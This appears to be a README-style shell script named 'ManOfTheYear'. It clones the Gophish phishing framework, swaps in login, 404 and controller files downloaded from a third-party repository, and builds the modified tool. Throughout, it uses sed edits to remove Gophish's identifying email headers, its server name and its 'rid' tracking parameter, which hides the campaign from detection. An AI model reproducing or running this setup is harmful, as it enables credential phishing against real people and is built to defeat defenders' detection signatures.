# ManOfTheYear

apt update -y
apt upgrade -y
apt-get update -y
apt-get upgrade -y
apt-get install gcc -y
wget https://go.dev/dl/go1.20.6.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.20.6.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
git clone https://github.com/gophish/gophish
wget "https://raw.githubusercontent.com/Lordspartner/ManOfTheYear/main/salt.html" -O "404.html"
wget "https://raw.githubusercontent.com/Lordspartner/ManOfTheYear/main/sugar.go" -O "phish.go"
wget "https://raw.githubusercontent.com/Lordspartner/ManOfTheYear/main/frontbase.html" -O "base.html"
wget "https://raw.githubusercontent.com/Lordspartner/ManOfTheYear/main/login.html" -O "login.html"
rm gophish/templates/base.html
rm gophish/templates/login.html
rm gophish/controllers/phish.go
mv base.html gophish/templates/base.html
mv login.html gophish/templates/login.html
mv phish.go gophish/controllers/phish.go
mv 404.html gophish/templates/404.html
cd gophish
sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request_test.go
sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog.go
sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog_test.go
sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request.go
sed -i 's/X-Gophish-Signature/X-Signature/g' webhook/webhook.go
sed -i 's/const ServerName = "gophish"/const ServerName = ""/' config/config.go
sed -i 's/const RecipientParameter = "rid"/const RecipientParameter = "login"/g' models/campaign.go
go build
